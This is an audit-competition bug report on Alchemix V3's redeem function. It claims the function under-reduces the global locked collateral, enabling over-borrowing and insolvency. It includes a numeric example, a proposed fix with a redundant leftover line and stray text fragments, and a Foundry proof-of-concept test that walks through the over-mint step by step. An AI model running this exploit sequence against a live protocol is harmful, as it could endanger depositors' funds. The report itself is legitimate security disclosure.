# 57197 sc high incorrect totallocked reduction

**Submitted on Oct 24th 2025 at 09:36:37 UTC by @Petrus for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57197
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Contract fails to deliver promised returns, but doesn't lose value
  * Protocol insolvency

## Description

## Brief/Intro

The redeem function in AlchemistV3.sol under-reduces the global \_totalLocked collateral by the net redeemed amount plus fee instead of the full debt reduction delta, causing overstated locked collateral, unauthorized over-minting, and potential protocol insolvency after price drops.

## Vulnerability Details

## Bug: Incorrect \_totalLocked Reduction

In the AlchemistV3.sol,

In redeem (),

```solidity
  function redeem(uint256 amount) external onlyTransmuter { 

        _earmark(); 

 

        uint256 liveEarmarked = cumulativeEarmarked; 

        if (amount > liveEarmarked) amount = liveEarmarked; 

 

        // observed transmuter pre-balance -> potential cover 

        uint256 transmuterBal = TokenUtils.safeBalanceOf(myt, address(transmuter)); 

        uint256 deltaYield    = transmuterBal > lastTransmuterTokenBalance ? transmuterBal - lastTransmuterTokenBalance : 0; 

        uint256 coverDebt = convertYieldTokensToDebt(deltaYield); 

 

        // cap cover so we never consume beyond remaining earmarked 

        uint256 coverToApplyDebt = amount + coverDebt > liveEarmarked ? (liveEarmarked - amount) : coverDebt; 

 

        uint256 redeemedDebtTotal = amount + coverToApplyDebt; 

 

       // Apply redemption weights/decay to the full amount that left the earmarked bucket 

        if (liveEarmarked != 0 && redeemedDebtTotal != 0) { 

            uint256 survival = ((liveEarmarked - redeemedDebtTotal) << 128) / liveEarmarked; 

            _survivalAccumulator = _mulQ128(_survivalAccumulator, survival); 

            _redemptionWeight += PositionDecay.WeightIncrement(redeemedDebtTotal, cumulativeEarmarked); 

        } 

 

        // earmarks are reduced by the full redeemed amount (net + cover) 

        cumulativeEarmarked -= redeemedDebtTotal; 

 

        // global borrower debt falls by the full redeemed amount 

     @>   totalDebt -= redeemedDebtTotal; 

 

        lastRedemptionBlock = block.number; 

 

        // consume the observed cover so it can't be reused 

        if (deltaYield != 0) { 

            uint256 usedYield = convertDebtTokensToYield(coverToApplyDebt); 

            lastTransmuterTokenBalance = transmuterBal > usedYield ? transmuterBal - usedYield : transmuterBal; 

        } 

 

        // move only the net collateral + fee 

        uint256 collRedeemed  = convertDebtTokensToYield(amount); 

        uint256 feeCollateral = collRedeemed * protocolFee / BPS; 

        uint256 totalOut      = collRedeemed + feeCollateral;  

 

        // update locked collateral + collateral weight 

        uint256 old = _totalLocked; 

    @>    _totalLocked = totalOut > old ? 0 : old - totalOut; // The bug <-- Reduces by totalOut (net + fee only), not by required delta for redeemedDebtTotal 

        _collateralWeight += PositionDecay.WeightIncrement(totalOut > old ? old : totalOut, old); 

 

        TokenUtils.safeTransfer(myt, transmuter, collRedeemed); 

        TokenUtils.safeTransfer(myt, protocolFeeReceiver, feeCollateral); 

        _mytSharesDeposited -= collRedeemed + feeCollateral; 

 

        emit Redemption(redeemedDebtTotal); 

    } 

```

totalDebt is reduced by redeemedDebtTotal (net debt amount + applied cover coverToApplyDebt). However, \_totalLocked (global minimum locked collateral in yield shares) is reduced by totalOut (redeemed collateral shares + protocol fee shares), which does not match the required locked delta for the full debt reduction.

Example scenario:

FIXED\_POINT\_SCALAR = 1e18

BPS = 10\_000

protocolFee = 100 (1% fee)

liquidatorFeeBPS = 300 (3%, unused in this redemption flow)

minimumCollateralization = (1e18 \* 1e18) // (9 \* 10\*\*17) = 1\_111\_111\_111\_111\_111\_111 (≈111.111...% collateralization ratio)

amount = 1,000 (net debt redeemed, in debt tokens).

coverToApplyDebt = 500 (cover applied, in debt tokens). Thus, redeemedDebtTotal = 1,500.

Initial global state: totalDebt = 10,000 debt tokens, \_totalLocked = 11,111 yield shares (exactly matching 111.111...% collateralization via (10,000 \* min\_coll) // 1e18).

The code correctly reduces totalDebt by the full 1,500 (to 8,500). But it reduces \_totalLocked by only totalOut = 1,010 (net redeemed shares + fee), instead of the required 1,666 shares ((1,500 \* min\_coll) // 1e18).

Simulation Results (Buggy vs. Correct)

Initial State:

totalDebt: 10,000

\_totalLocked: 11,111

Implied Collateralization: ≈111.11%

After Redemption (Buggy Code):

totalDebt: 8,500

\_totalLocked: 10,101 (11,111 - 1,010)

Implied Collateralization: ≈118.84% (overstated—the system thinks more collateral is locked than actually required)

After Redemption (Correct Fix):

totalDebt: 8,500

\_totalLocked: 9,445 (11,111 - 1,666)

Implied Collateralization: ≈111.12% (matches the target, minor rounding due to integer division)

Impact:

\_totalLocked is overstated by 656 yield shares.

## SOLN

Replace the current \_totalLocked update with a computation based on the actual debt reduction (redeemedDebtTotal), ensuring it tracks the theoretical minimum required locked collateral post-redemption. Keep the \_collateralWeight update unchanged, as it correctly reflects the actual collateral outflow (totalOut) for pro-rata share deductions.

```solidity

// After: totalDebt -= redeemedDebtTotal; 
 
// Compute the required locked delta based on full debt reduction 
uint256 deltaLocked = convertDebtTokensToYield(redeemedDebtTotal) * minimumCollateralization / FIXED_POINT_SCALAR; 
 
// Update _totalLocked by the required delta (clamp to avoid underflow) 
uint256 oldLocked = _totalLocked; 
_totalLocked = deltaLocked > oldLocked ? 0 : oldLocked - deltaLocked; 
 
// Keep collateral weight update based on actual outflow (unchanged) 
uint256 old = _totalLocked;  // Note: Use pre-update 'oldLocked' if needed for precision, but current logic is fine 
_collateralWeight += PositionDecay.WeightIncrement(totalOut > oldLocked ? oldLocked : totalOut, oldLocked); 
 
// Rest unchanged: transfers and _mytSharesDeposited -= ... 
```

Where to Implement: In the redeem function, immediately after totalDebt -= redeemedDebtTotal; and before the transfers (TokenUtils.safeTransfer...). This ensures the locked collateral update happens in sync with the debt reduction, before collateral is moved out. ... where does this one fall

## Impact Details

This issue makes \_totalLocked inconsistent with the actual minimum required collateral after debt reductions, causing over- or under-locking clamps in \_subDebt and erroneous pro-rata collateral deductions in \_sync, which risks incorrect withdraws or premature liquidations. Therefore, this breaks the global collateral invariant: In future operations like \_subDebt (e.g., during user repayments), the clamp toFree = min(toFree, \_totalLocked) frees too few shares (using the inflated value), leaving excess "locked" collateral unavailable and risking withdraw failures (users can't access their free collateral). Pro-rata deductions in \_sync also distort over multiple redemptions, as \_collateralWeight baselines against the wrong locked total, amplifying undercollateralization drift system-wide.

## References

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L589>

## Proof of Concept

## Proof of Concept

Put tut the test in the AlchemistV3.t.sol

Run the test with: forge test --match-test testRedeemTotalLockedUnderReduction -vvvv

```solidity
function testRedeemTotalLockedUnderReduction() external { 

    // Setup: Deposit 10e18 yield shares, mint max 9e18 debt tokens (collateralization exactly at minimum) 

    uint256 initialDepositAmount = 10e18; 

    vm.startPrank(address(0xbeef)); 

    SafeERC20.safeApprove(address(vault), address(alchemist), initialDepositAmount); 

    alchemist.deposit(initialDepositAmount, address(0xbeef), 0); 

    uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT)); 

    uint256 initialDebt = 9e18; 

    alchemist.mint(tokenId, initialDebt, address(0xbeef)); 

    vm.stopPrank(); 

 

    // Verify initial state: collateralization exactly at minimum (max borrowable = 0) 

    assertEq(alchemist.getMaxBorrowable(tokenId), 0); 

 

    // Set protocol fee to 0 to avoid fee rounding in redemption 

    vm.prank(alOwner); 

    alchemist.setProtocolFee(0); 

 

    // Perform redemption: net amount=1e18 debt (no cover, redeemedDebtTotal=1e18) 

    uint256 redemptionAmount = 1e18; 

    vm.startPrank(address(0xdad)); 

    deal(address(alToken), address(0xdad), redemptionAmount); 

    SafeERC20.safeApprove(address(alToken), address(transmuterLogic), redemptionAmount); 

    transmuterLogic.createRedemption(redemptionAmount); 

    vm.roll(block.number + transmuterLogic.timeToTransmute() + 1); // Mature redemption 

    transmuterLogic.claimRedemption(1); // Triggers alchemist.redeem(1e18), reduces totalDebt by 1e18 to 8e18 

    vm.stopPrank(); 

 

    // Sync position to apply redemption effects 

    vm.prank(address(0xbeef)); 

    alchemist.poke(tokenId); 

 

    // Post-redemption: totalDebt reduced by 1e18 to 8e18 

    (, uint256 postDebt, ) = alchemist.getCDP(tokenId); 

    assertEq(postDebt, 8e18); 

 

    // Bug: Due to under-reduction in _totalLocked (by 1e18 yield shares instead of required 1.111e18), 

    // collateral deduction in _sync is insufficient, overstating position collateral 

    // Expected: collateralization remains exactly at minimum (max borrowable = 0) 

    // Actual: artificial overcollateralization (max borrowable > 0) 

    assertGt(alchemist.getMaxBorrowable(tokenId), 0); 

 

    // Impact: Allows unauthorized additional borrowing beyond minimum collateralization invariant 

    uint256 unauthorizedBorrow = alchemist.getMaxBorrowable(tokenId); 

    vm.startPrank(address(0xbeef)); 

    alchemist.mint(tokenId, unauthorizedBorrow, address(0xbeef)); // Succeeds due to overstated collateral 

    vm.stopPrank(); 

 

    // Now drop price by 5.9% to reveal undercollateralization 

    uint256 initialSupply = IERC20(mockStrategyYieldToken).totalSupply(); 

    MockYieldToken(mockStrategyYieldToken).updateMockTokenSupply((initialSupply * 1059) / 1000); // +5.9% supply = -5.9% price 

 

    // With bug: over-minted position now undercollateralized after price drop 

    uint256 postDropCollateralValue = alchemist.totalValue(tokenId); 

    (, uint256 postDropDebt, ) = alchemist.getCDP(tokenId); // Unchanged by price drop 

    uint256 postDropRatio = (postDropCollateralValue * 1e18) / postDropDebt; 

    assertLt(postDropRatio, alchemist.minimumCollateralization()); 

} 

```

Proof of Bug Exploitation

Initial State (Exact Minimum Collateralization):

Deposit: 10e18 yield shares (collateralBalance = 10e18).

Mint: 9e18 debt tokens (max borrowable = 0, as (10e18 yield \* 1e18) / 1.111e18 ≈ 9e18 debt).

Global: totalDebt = 9e18, \_totalLocked = 10e18 (exact match for 111.111% ratio).

Redemption Trigger:

Redeem 1e18 net debt (protocolFee=0, no cover, so redeemedDebtTotal=1e18).

Code correctly reduces totalDebt by 1e18 (to 8e18).

But \_totalLocked reduced by only totalOut=1e18 yield shares (net redeemed), not the required 1.111e18 ((1e18 debt \* 1.111e18 min\_coll) / 1e18).

Result: \_totalLocked overstated by 0.111e18 (9e18 instead of 8.889e18).

Sync Effect (\_poke):

\_collateralWeight incremented based on understated reduction (1e18 vs. 1.111e18), so PositionDecay.ScaleByWeightDelta under-deducts from collateralBalance.

Actual collateralBalance after poke: \~9e18 (overstated by \~0.111e18; exact trace shows 9e18).

This creates artificial overcollateralization: getMaxBorrowable(1) = 0.91e17 > 0 (assertGt passes).

Proof of Impact (Invariant Break)

Unauthorized Mint: Succeeds with 0.91e17 extra debt (total debt=8.1e18), as overstated collateral fools \_validate (would revert if correct).

Price Drop Simulation (5.9% drop via supply inflation, as in liquidation tests):

Collateral value drops to 8.498e18 (9e18 yield \* 0.94428 price).

Debt unchanged: 8.1e18.

Ratio: (8.498e18 \* 1e18) / 8.1e18 ≈ 1.049e18 < 1.111e18 min\_collateralization (assertLt passes).

Consequence: Position undercollateralized post-drop, allowing insolvency risk. Without bug, no unauthorized mint → no undercollateralization (ratio stays \~1.111e18).

Trace Confirmation

Post-redemption poke: CDP=(9e18 collat, 8e18 debt) — overcollateralized (bug).

Max borrowable=0.91e17 >0 — exploit.

Post-mint: CDP=(9e18, 8.1e18) — still "healthy" per bug.

Post-drop: totalValue=8.498e18, ratio\<min — broken invariant.

This end-to-end flow directly exploits the under-reduction in redeem(), leading to over-mint and undercollateralization—proving the bug breaks the global collateral invariant, risking system insolvency .
